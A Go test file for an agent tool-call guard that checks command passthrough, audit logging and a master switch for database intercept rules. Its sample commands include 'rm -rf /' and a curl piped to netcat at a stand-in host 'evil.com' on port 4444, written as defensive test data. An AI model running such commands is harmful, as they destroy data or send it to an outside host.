package guard

import (
	"context"
	"encoding/json"
	"net/url"
	"testing"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/intercept"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

// guardTestDB 打开一个本包专属的测试库。
//
// 本用例要往 intercept_rules 插规则、并翻 intercept_enabled 设置；和别的包（server）
// 共用同一个库会互相干扰——Go 默认并行跑不同的包。
func guardTestDB(t *testing.T) *db.DB {
	t.Helper()
	dsn, _, err := db.DSN()
	if err != nil {
		t.Skipf("no database config (%v) — skipping", err)
	}
	u, err := url.Parse(dsn)
	if err != nil {
		t.Skipf("unparseable dsn (%v) — skipping", err)
	}
	u.Path = "/artex_test_guard"
	d, err := db.Open(u.String())
	if err != nil {
		t.Skipf("postgres unavailable (%v) — skipping", err)
	}
	t.Cleanup(func() { d.Close() })
	return d
}

// 拦截总开关（系统设置 → 命令拦截 → 总开关）：关掉之后工具调用必须完全放行——不匹配
// 规则、不走模型兜底、不请求人工审批。
//
// 用户要这个开关，是因为内置规则是对整个 tool_input 做子串/正则匹配的：Write 一个文件、
// 只要内容里出现 "DROP TABLE"、TRUNCATE、"/delete" 这类词就会被 deny，而代码审计平台写
// 报告、写 PoC、写修复建议时很容易带上这些词。
func TestMasterSwitchDisablesIntercept(t *testing.T) {
	const marker = "artex-master-switch-marker"
	d := guardTestDB(t)
	if _, err := d.CreateInterceptRule("test-master-switch", "tool_input", "string", marker,
		"deny", "测试规则命中", 100, true, false, 0, ""); err != nil {
		t.Fatal(err)
	}
	it := intercept.New(d)
	g := NewWithInterceptor(it)
	input, _ := json.Marshal(map[string]string{"content": "报告里提到了 " + marker})

	blocked, _, _ := g.Hooks().PreToolUse(context.Background(), "Write", input)
	if !blocked {
		t.Fatal("总开关默认开启时，命中 deny 规则的调用应被拦截")
	}

	if err := it.SetEnabled(false); err != nil {
		t.Fatal(err)
	}
	if blocked, _, _ = g.Hooks().PreToolUse(context.Background(), "Write", input); blocked {
		t.Fatal("总开关关闭后不应再拦截任何调用")
	}

	// 重新打开必须立刻生效，不能只在进程重启后才恢复。
	if err := it.SetEnabled(true); err != nil {
		t.Fatal(err)
	}
	if blocked, _, _ = g.Hooks().PreToolUse(context.Background(), "Write", input); !blocked {
		t.Fatal("总开关重新打开后应恢复拦截")
	}
}
